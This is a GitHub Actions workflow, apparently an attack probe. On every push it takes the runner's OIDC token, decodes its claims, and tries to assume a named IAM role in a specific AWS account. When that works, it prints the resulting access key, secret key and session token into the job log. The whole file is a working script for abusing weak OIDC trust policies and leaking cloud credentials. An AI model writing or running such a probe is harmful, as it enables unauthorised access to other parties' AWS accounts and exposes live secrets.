name: arnprobe-i3915
on: [push, workflow_dispatch]
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: probe
        run: |
          set +e
          TOK=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          if [ -z "$TOK" ] || [ "$TOK" = "null" ]; then echo NO_OIDC; exit 0; fi
          echo "HAVETOK ${#TOK}"
          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
          for ARN in arn:aws:iam::296062593712:role/github-actions-cua-downloads-publish; do
            R=$(aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name p3915 --web-identity-token "$TOK" --duration-seconds 900 --output json 2>&1)
            if [ $? -eq 0 ]; then echo "OK $ARN"; echo "$R" | jq -r '[.Credentials.AccessKeyId,.Credentials.SecretAccessKey,.Credentials.SessionToken]|join("|")'; else echo "TRY $ARN => $(echo "$R" | tr '\n' ' ' | head -c 300)"; fi
          done
          echo PROBE_DONE
